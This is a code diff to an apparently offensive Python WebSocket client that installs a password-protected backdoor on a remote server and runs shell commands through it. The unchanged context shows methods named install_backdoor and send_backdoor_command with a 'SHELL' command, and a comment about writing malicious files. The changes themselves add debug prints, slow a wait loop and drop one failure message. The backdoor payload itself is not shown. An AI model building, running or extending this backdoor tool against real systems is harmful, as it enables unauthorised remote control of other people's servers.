@@ -294,12 +294,14 @@ class WsClient():
       self.backdoored = False
   
   def test_is_backdoored( self, password ):
+    print('test_is_backdoored')
     self.backdoored = None
     self.uniq = md5(str(time.time()))
     self.callbacks.append( self.cb_set_backdoored )
     self.send_backdoor_command( 'SHELL', password,  "echo \"" + base64.b64encode(self.uniq.encode('utf8')).decode('utf8') + "\" | base64 -d" )
     while self.backdoored is None:
-      time.sleep(0.1)
+      print('Wait')
+      time.sleep(1)
     return self.backdoored
 
   def install_backdoor( self, password ):
@@ -332,7 +334,7 @@ class WsClient():
       url = defaulturl
 
     # Request doc, write the malicious files
-    
+    print('Going to request doc from ' + url + '. You can edit this manually in the source or run with the real URL using the "dl" command.') 
     client = WsClient( 
       self.url, 
       md5(str(time.time())), 
@@ -360,7 +362,6 @@ class WsClient():
     if not self.backdoored:
       self.install_backdoor( password )
       if not self.test_is_backdoored( password ):
-        print('Didn\'t appear to work. You could try again, or maybe you broke it entirely')
         return
 
     while True:
